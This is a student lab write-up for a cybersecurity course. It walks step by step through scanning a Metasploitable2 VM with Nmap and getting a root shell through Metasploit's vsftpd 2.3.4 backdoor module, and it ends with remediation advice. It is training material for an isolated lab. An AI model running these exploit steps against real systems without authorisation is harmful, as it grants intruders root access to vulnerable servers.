# Cybersecurity : CSN150
Project: Rapid Penetration Testing & Vulnerability Validation

## Purpose
Problem it Solves: It addresses the need for "security validation proving that a known vulnerability actually exists and can be exploited before a patch is applied.


##### AI GPTs used
Gemini

## Steps I followed

1. Check target IP on Metasploitable2:
   ifconfig

2. Run targeted Nmap scan from Kali Linux:
   nmap -sV -O -p 21,22,139,445 192.168.10.128

3. Initialize Metasploit database using elevated privileges:
   sudo msfdb init

4. Launch Metasploit console:
   sudo msfconsole

5. Search for matching exploit module:
   search vsftpd 2.3.4

6. Select and load the backdoor exploit:
   use exploit/unix/ftp/vsftpd_234_backdoor

7. Inspect required configuration settings:
   show options

8. Bind the target IP to the exploit module:
   set RHOSTS 192.168.10.128

9. Launch the exploit and establish the shell:
   exploit

10. Run system validation commands to verify root access:
    whoami
    id
    hostname
    ifconfig


## Problems and Solutions
1.	Fixing the Network Setup: Moving away from cloud setups to a local VMware Host-Only network made the lab totally free to build and much more secure, keeping the highly vulnerable target completely offline.
2.	Handling Permissions: When setting up the Metasploit database, Linux threw a permissions error because the standard kali user doesn't have administrative rights. Prepending sudo to msfdb init quickly bypassed the barrier.
3.	Remediation: To secure this system, the vsftpd software needs to be updated to a version past 2.3.4, and Port 21 should be locked down using a local firewall.


## Final Report

https://1drv.ms/w/c/dd12fe4eea5a0a53/IQBsNJz9qjOBRJ6fZOkvRyYfAYk4O9A6WtagfnR3mFCjdnA?e=5MoNVe
